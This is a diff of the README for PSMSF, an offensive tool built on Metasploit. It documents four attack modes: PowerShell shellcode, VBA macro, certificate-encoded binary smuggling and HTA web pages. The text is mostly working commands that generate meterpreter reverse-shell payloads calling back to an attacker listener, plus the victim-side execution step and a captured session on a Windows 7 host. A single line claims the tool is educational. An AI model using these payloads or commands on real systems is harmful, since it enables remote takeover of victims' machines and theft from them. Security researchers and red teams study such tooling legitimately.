@@ -2,9 +2,30 @@
 
 [**PSMSF**](https://github.com/all3g/psmsf/) can help us generate payload or files used in cmd console/browser/.. with [**Metasploit-Framework**](https://github.com/rapid7/metasploit-framework/). If you are similar to windows cmd console, you can use the results in different areas.
 
+**Note**: psmsf is just for the edutional purpose.
+
+
+### **Requirement**
+
+If you use [**Kali Linux**](https://www.kali.org), Install [**Metasploit-Framework**](https://www.metasploit.com/) with the command:
+
 ```
-psmsf [master●] python psmsf.py -h
-Usage: python psmsf.py [options]
+$ sudo apt-get install metasploit-framework
+```
+
+
+### **Usage**
+
+[**psmsf**](https://github.com/join-us/psmsf) has following attack types,
+
+- [x] powershell attack
+- [x] vba macro Attack
+- [x] cert attack
+- [x] hta attack
+
+```
+psmsf [master] psmsf -h
+Usage: python psmsf [options]
 
 Options:
   -h, --help            show this help message and exit
@@ -30,37 +51,28 @@ Options:
     attacked from Internet Explorer
 
     --command=COMMAND   command of attack mode
+
+  Output Direcroty:
+    Write payload file or script to the destination directory
+
+    --output=OUTPUT     please a output directory (not a file), default:
+                        current directory
 ```
 
-### **Requirement**
-
-If you use [**Kali Linux**](https://www.kali.org), Install [**Metasploit-Framework**](https://www.metasploit.com/) with the command:
-
-```
-$ sudo apt-get install metasploit-framework
-```
-
-
-### **Usage**
-
-[**psmsf**](https://github.com/all3g/psmsf) has three attack types,
-
-- [x] powershell attack
-- [x] cert attack
-- [x] hta attack
+----
 
 #### Powershell Attack Mode
 
 ```
-psmsf [master●] python psmsf.py --attacktype ps
+psmsf [master] psmsf --attacktype ps
 [+]
-     ######
-      #     #  ####  #    #  ####  ######
-       #     # #      ##  ## #      #
-        ######   ####  # ## #  ####  #####
-         #            # #    #      # #
-          #       #    # #    # #    # #
-           #        ####  #    #  ####  #
+        ++++++
+        +     +  ++++  +    +  ++++  ++++++
+        +     + +      ++  ++ +      +
+        ++++++   ++++  + ++ +  ++++  +++++
+        +            + +    +      + +
+        +       +    + +    + +    + +
+        +        ++++  +    +  ++++  +
 
 [+] Everything is now generated in two files, ex:
     powershell_hacking.bat - shellcode can be executed in cmd console.
@@ -76,9 +88,16 @@ psmsf [master●] python psmsf.py --attacktype ps
 Everything is now generated in two files,
 
 ```
-psmsf [master●] python psmsf.py --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost 192.168.1.101 --lport 8443
+psmsf [master] psmsf --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost 192.168.1.101 --lport 8443
 [+] create msfconsole resource script
 [+] create powershell shellcode command
+```
+
+If you want to output scripts to special destination directory, you can do it with the **```--output```** option.
+
+
+```
+psmsf [master] ./psmsf --attacktype ps --payload windows/shell/reverse_tcp --lhost 192.168.1.100 --lport 8443 --output /tmp
 ```
 
 **Victim**
@@ -94,7 +113,7 @@ cmd.exe /c powershell_hacking.bat
 Starts a **metasploit-framework** listeners,
 
 ```
-psmsf [master●] msfconsole -r powershell_msf.rc
+psmsf [master] msfconsole -r powershell_msf.rc
 
 # cowsay++
  ____________
@@ -156,12 +175,14 @@ Computer        : SEC
 OS              : Windows 7 (Build 7600).
 ```
 
+----
+
 #### Macro Attack Mode
 
 Create a macro VBA for shellcode executation.
 
 ```
-root@lab:/usr/share/psmsf# python psmsf.py --attacktype mac --payload windows/meterpreter/reverse_https --lhost 192.168.1.101 --lport 8443
+root@lab:/# psmsf --attacktype mac --payload windows/meterpreter/reverse_https --lhost 192.168.1.101 --lport 8443
 [+] create msfconsole resource script
 [+] create powershell shellcode command
 [+]
@@ -179,13 +200,15 @@ Application.Quit
 End Sub
 ```
 
+----
+
 #### Cert Attack Mode
 
 You can translate a binary file to a certificate file which is a text file.
 
 ```
-psmsf [master●] python psmsf.py --attacktype crt --filename demo.exe
-psmsf [master●] ll cert_attack
+psmsf [master] psmsf --attacktype crt --filename demo.exe
+psmsf [master] ll cert_attack
 total 48
 -rw-r--r--  1 Open-Security  staff    44B Feb 20 21:31 cert_decode.bat
 -rw-r--r--  1 Open-Security  staff    17K Feb 20 21:31 cert_encode.crt
@@ -193,16 +216,17 @@ total 48
 
 Upload **cert_encode.crt** to victim machine, and restore it with windows batch script - **cert_decode.bat**.
 
+----
 
 #### HTA Attack Mode
 
 Create windows hta web page, and you can access **http://demo.com/index.html** with Internet Explorer Browser.
 
 ```
-psmsf [master●] python psmsf.py --attacktype hta --command whoami               
+psmsf [master] psmsf --attacktype hta --command whoami               
 [+] create hta index file
 [+] create hta module file
-psmsf [master●] ll windows_hta_attack
+psmsf [master] ll windows_hta_attack
 total 16
 -rw-r--r--  1 Open-Security  staff   151B Feb 20 21:37 index.html
 -rw-r--r--  1 Open-Security  staff   122B Feb 20 21:37 module.hta
